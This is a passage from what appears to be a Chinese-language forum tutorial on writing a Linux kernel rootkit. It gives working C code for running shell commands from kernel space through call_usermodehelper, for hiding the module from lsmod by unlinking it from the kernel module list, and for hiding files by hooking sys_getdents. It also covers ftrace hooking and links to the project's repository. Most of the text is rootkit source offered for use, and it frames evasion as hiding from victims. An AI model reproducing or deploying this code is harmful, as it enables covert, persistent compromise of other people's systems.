
```c
static char\* execcmd(char cmd[1024])
{
int result;
struct file \*fp;
mm\_segment\_t fs;
loff\_t pos;
static char buf[4096];
char add[] = " > /tmp/result.txt";
char cmd\_path[] = "bin/sh";
strcat(cmd,add);
char \*cmd\_argv[] = {cmd\_path,"-c",cmd,NULL};
char \*cmd\_envp[] = {"HOME=/","PATH=/sbin:/bin:/user/bin",NULL};
result = call\_usermodehelper(cmd\_path,cmd\_argv,cmd\_envp,UMH\_WAIT\_PROC);
printk(KERN\_INFO "[TestKthread]: call\_usermodehelper() result is %d\n",result);
fp = filp\_open("/tmp/result.txt",O\_RDWR | O\_CREAT,0644);
if(IS\_ERR(fp)) {
printk(KERN\_INFO "open file failed!\n");
return 0;
}
memset(buf,0,sizeof(buf));
fs = get\_fs();
set\_fs(KERNEL\_DS);
pos = 0;
vfs\_read(fp,buf,sizeof(buf),&pos);
printk(KERN\_INFO "shell result %ld:\n",strlen(buf));
printk("%s\n",buf);
filp\_close(fp,NULL);
set\_fs(fs);
return buf;
}
```

---

# 八、隐藏内核模块自身

**1、对于linux kernel rootkit，很重要的一点就是隐藏自己的存在，不然受害者一个 `lsmod` 就发现了**

**2、通过 `lsmod` 读出来的已经加载的内核模块在内存中的表现形式为一个链表，我们可以通过添加、删除这个链表中的节点来实现对内核模块的显示和隐藏**

**3、我们可以通过 `THIS_MODULE` 这个变量来访问上述的连接，幸运的是，官方提供了API 来添加和删除节点，分别为 `list_del` 和 `list_add` 函数**

**4、实现该功能源码如下所示：**

```c
void hideme(void)
{
prev_module = THIS_MODULE->list.prev;
list_del(&THIS_MODULE->list);
}
void showme(void)
{
list_add(&THIS_MODULE->list,prev_module);
}
```

---

# 九、隐藏文件

**1、由于前面的命令执行功能获取命令回显结果产生了一些文件，所以我们还要隐藏这些产生从文件来避免我们的rootkit被发现**

**2、我们可以通过hook `sys_getdents` 系统调用来实现，该系统调用有三个参数，其中第二个参数为一个指针，该指针所存储的即为一个目录的文件和目录信息，在内存中的数据结构为一个链表，通过遍历这个链表然后删除相应的节点即可达到隐藏文件的目的**

**3、该链表的数据结构如下所示，其中，`d_name` 为文件或目录的名称，`d_reclen` 为长度，通过这两个数据，我们即可实现隐藏文件和目录的功能**

```c
struct linux_dirent {
unsigned long d_ino;
unsigned long d_off;
unsigned short d_reclen;
char d_name[];
};
```

**4、该功能实现示例如下所示：**

```c
asmlinkage int hook_getdents(const struct pt_regs *regs)
{
struct linux_dirent {
unsigned long d_ino;
unsigned long d_off;
unsigned short d_reclen;
char d_name[];
};
struct linux_dirent __user *dirent = (struct linux_dirent *)regs->si;
struct linux_dirent *current_dir,*previous_dir,*dirent_ker = NULL;
unsigned long offset = 0;
long error;
int ret = orig_getdents(regs);
dirent_ker = kzalloc(ret, GFP_KERNEL);
if ((ret <= 0) || (dirent_ker == NULL))
{
printk(KERN_DEBUG "error 1,ret is %d\n",ret);
return ret;
}
error = copy_from_user(dirent_ker, dirent, ret);
if(error)
{
printk(KERN_DEBUG "error 2\n");
goto done;
}
while(offset < ret)
{
current_dir = (void *)dirent_ker + offset;
if(check(current_dir->d_name) == 1)
{
if(debug_mode == 1)
{
printk(KERN_DEBUG "rootkit: Found %s\n", current_dir->d_name);
}
if(current_dir == dirent_ker)
{
ret -= current_dir->d_reclen;
memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
continue;
}
previous_dir->d_reclen += current_dir->d_reclen;
}
else
{
previous_dir = current_dir;
}
offset += current_dir->d_reclen;
}
error = copy_to_user(dirent, dirent_ker, ret);
if(error)
{
printk(KERN_DEBUG "error 3\n");
goto done;
}
done:
kfree(dirent_ker);
return ret;
}
```

---

# 十、ftrace使用方法

**1、导入头文件 `ftrace_helper.h`**

**2、定义一个 `ftrace_hook hooks` 结构体数组，如下所示：**

```c
static struct ftrace_hook hooks[] = {
HOOK("sys_mkdir",hook_mkdir,&orig_mkdir),
};
```

调用 `fh_install_hooks` 函数挂钩，调用 `fh_remove_hooks` 函数解挂即可

---

# 十一、其他

**1、在 `linux kernel 4.17` 之后，系统调用函数的参数全部存储在 `pt_reg` 结构体中，要实际访问到其参数，需要去读取该结构体**

**2、由于rootkit运行在内核空间中，要访问用户空间的数据，需要使用 `strncpy_from_user` 等函数将用户空间的变量拷贝到内核空间中**

**3、要申请内核空间，不能使用 `malloc`，而是要使用 `kmalloc` 等函数来申请**

---

# 十二、linux kernel rootkit使用截图

**1、命令执行**

![](upload/attach/202208/851220_G4DTM5A5Z9V854F.jpg)

**2、隐藏内核模块**

![](upload/attach/202208/851220_VEYQTSJA3GZJJZ4.jpg)

![](upload/attach/202208/851220_DZRKCT2BRJ6MEE2.jpg)

![](upload/attach/202208/851220_QZAQRMEMSECGPAX.jpg)

**3、隐藏文件**

![](upload/attach/202208/851220_PC35KDBWMTVHW7G.jpg)

![](upload/attach/202208/851220_93ZETFVA6Q7P4UQ.jpg)

![](upload/attach/202208/851220_MF8395VPQ7D9EQQ.jpg)

---

# 十三、github以及参考连接

**1、github链接：**

<a href="elink@4d9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6%4K9h3&6V1P5g2)9J5k6s2m8#2M7Y4m8D9k6g2)9J5c8X3I4A6L8Y4g2^5i4K6g2X3K9$3g2J5L8X3g2D9i4K6g2X3M7X3!0G2N6r3E0A6N6l9`.`."><mark class="encrypted">40cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6%4K9h3&6V1P5g2)9J5k6s2m8#2M7Y4m8D9k6g2)9J5c8X3I4A6L8Y4g2^5i4K6g2X3K9$3g2J5L8X3g2D9i4K6g2X3M7X3!0G2N6r3E0A6N6l9`.`.</mark></a>

**2、参考链接：**

<a href="elink@d6aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3#2K6k6i4c8Q4x3X3g2%4L8%4u0V1M7s2u0W2M7%4y4Q4x3X3g2U0L8$3#2Q4x3V1j5J5x3o6p5I4i4K6u0r3x3o6q4Q4x3V1j5J5x3q4)9J5c8Y4y4&6M7$3y4S2L8r3I4Q4x3X3c8Z5K9h3A6S2j5$3E0A6L8X3N6Q4x3X3c8V1P5h3&6S2L8h3W2U0j5h3I4D9P5g2)9J5k6r3!0T1N6r3q4A6L8W2)9J5k6s2y4&6M7$3y4S2L8r3I4Q4x3X3c8@1j5h3u0D9k6g2)9J5k6r3q4V1k6s2u0W2M7%4y4Q4x3X3c8C8k6i4u0F1k6h3I4Q4x3X3b7J5i4K6u0V1y4W2)9J5k6s2S2Q4x3V1j5`."><mark class="encrypted">2e0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3#2K6k6i4c8Q4x3X3g2%4L8%4u0V1M7s2u0W2M7%4y4Q4x3X3g2U0L8$3#2Q4x3V1j5J5x3o6p5I4i4K6u0r3x3o6q4Q4x3V1j5J5x3q4)9J5c8Y4y4&6M7$3y4S2L8r3I4Q4x3X3c8Z5K9h3A6S2j5$3E0A6L8X3N6Q4x3X3c8V1P5h3&6S2L8h3W2U0j5h3I4D9P5g2)9J5k6r3!0T1N6r3q4A6L8W2)9J5k6s2y4&6M7$3y4S2L8r3I4Q4x3X3c8@1j5h3u0D9k6g2)9J5k6r3q4V1k6s2u0W2M7%4y4Q4x3X3c8C8k6i4u0F1k6h3I4Q4x3X3b7J5i4K6u0V1y4W2)9J5k6s2S2Q4x3V1j5`.</mark></a>

<a href="elink@8d7K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3#2K6k6i4c8Q4x3X3g2%4L8%4u0V1M7s2u0W2M7%4y4Q4x3X3g2U0L8$3#2Q4x3V1j5J5x3o6p5I4i4K6u0r3x3o6y4Q4x3V1j5I4z5q4)9J5c8Y4y4&6M7$3y4S2L8r3I4Q4x3X3c8Z5K9h3A6S2j5$3E0A6L8X3N6Q4x3X3c8V1P5h3&6S2L8h3W2U0j5h3I4D9P5g2)9J5k6r3!0T1N6r3q4A6L8W2)9J5k6s2y4&6M7$3y4S2L8r3I4Q4x3X3c8@1j5h3u0D9k6g2)9J5k6r3q4V1k6s2u0W2M7%4y4Q4x3X3c8C8k6i4u0F1k6h3I4Q4x3X3b7J5i4K6u0V1y4W2)9J5k6s2S2Q4x3X3b7J5i4K6u0r3"><mark class="encrypted">584K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3#2K6k6i4c8Q4x3X3g2%4L8%4u0V1M7s2u0W2M7%4y4Q4x3X3g2U0L8$3#2Q4x3V1j5J5x3o6p5I4i4K6u0r3x3o6y4Q4x3V1j5I4z5q4)9J5c8Y4y4&6M7$3y4S2L8r3I4Q4x3X3c8Z5K9h3A6S2j5$3E0A6L8X3N6Q4x3X3c8V1P5h3&6S2L8h3W2U0j5h3I4D9P5g2)9J5k6r3!0T1N6r3q4A6L8W2)9J5k6s2y4&6M7$3y4S2L8r3I4Q4x3X3c8@1j5h3u0D9k6g2)9J5k6r3q4V1k6s2u0W2M7%4y4Q4x3X3c8C8k6i4u0F1k6h3I4Q4x3X3b7J5i4K6u0V1y4W2)9J5k6s2S2Q4x3X3b7J5i4K6u0r3</mark></a>

<a href="elink@8b6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6N6r3q4U0K9$3!0$3k6i4u0X3L8r3!0%4i4K6u0W2j5$3!0E0i4K6u0r3M7i4g2W2M7%4c8A6L8$3&6K6i4K6u0r3x3K6V1#2x3o6t1I4z5e0S2Q4x3V1k6X3K9h3&6V1K9h3&6Y4i4K6u0V1N6r3S2W2i4K6u0V1M7%4W2K6i4K6u0V1j5$3q4D9L8q4)9J5k6s2c8S2j5X3I4W2i4K6u0V1K9h3&6Q4x3X3c8E0k6h3#2G2M7Y4W2Q4x3X3b7$3y4q4)9J5k6r3u0A6N6q4)9J5k6r3!0F1i4K6u0V1y4q4)9J5k6s2S2Q4x3X3c8^5i4K6u0V1K9$3g2J5L8X3g2D9"><mark class="encrypted">eadK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6N6r3q4U0K9$3!0$3k6i4u0X3L8r3!0%4i4K6u0W2j5$3!0E0i4K6u0r3M7i4g2W2M7%4c8A6L8$3&6K6i4K6u0r3x3K6V1#2x3o6t1I4z5e0S2Q4x3V1k6X3K9h3&6V1K9h3&6Y4i4K6u0V1N6r3S2W2i4K6u0V1M7%4W2K6i4K6u0V1j5$3q4D9L8q4)9J5k6s2c8S2j5X3I4W2i4K6u0V1K9h3&6Q4x3X3c8E0k6h3#2G2M7Y4W2Q4x3X3b7$3y4q4)9J5k6r3u0A6N6q4)9J5k6r3!0F1i4K6u0V1y4q4)9J5k6s2S2Q4x3X3c8^5i4K6u0V1K9$3g2J5L8X3g2D9</mark></a>

<a href="elink@97dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5j5$3g2D9L8r3g2J5j5i4c8G2M7W2)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3M7r3!0K6N6s2y4Q4x3V1k6D9K9h3&6#2P5q4)9#2k6Y4u0G2L8%4c8C8K9i4c8K6i4K6g2X3x3o6q4Q4x3V1j5`."><mark class="encrypted">699K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5j5$3g2D9L8r3g2J5j5i4c8G2M7W2)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3M7r3!0K6N6s2y4Q4x3V1k6D9K9h3&6#2P5q4)9#2k6Y4u0G2L8%4c8C8K9i4c8K6i4K6g2X3x3o6q4Q4x3V1j5`.</mark></a>

<a href="elink@e59K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6P5i4y4U0j5h3I4D9M7K6j5@1i4K6u0W2M7r3q4G2L8r3!0K6N6r3W2$3j5h3&6A6L8W2)9J5k6h3y4G2L8g2)9J5c8R3`.`."><mark class="encrypted">0f4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6P5i4y4U0j5h3I4D9M7K6j5@1i4K6u0W2M7r3q4G2L8r3!0K6N6r3W2$3j5h3&6A6L8W2)9J5k6h3y4G2L8g2)9J5c8R3`.`.</mark></a>
